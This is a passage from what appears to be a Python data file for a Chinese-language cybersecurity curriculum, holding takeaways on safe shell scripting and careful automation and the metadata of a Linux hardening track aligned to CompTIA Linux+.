        "`set -euo pipefail` 與變數加引號是專業 shell 腳本的最低標準。",
        "巡檢腳本只讀不改，並輸出明確的 PASS/FAIL 與修正建議。",
        "自動化要有白名單、速率限制與一鍵回滾；高風險不可逆的動作保留人工判斷。",
    ],
})

TRACK = {
    "id": "t3-linux",
    "title": "Linux 系統與加固",
    "code": "CompTIA Linux+ XK0-005",
    "stage": 1,
    "stageName": "第一階段 · 打底",
    "color": "amber",
    "tagline": "資安工具跑在 Linux 上，伺服器也是 Linux。這是你的工作台。",
    "goal": "能在終端機自在操作、看懂權限與程序、加固一台主機、從日誌裡找出入侵痕跡、寫出自己的巡檢腳本。",
    "chapters": CH,
}
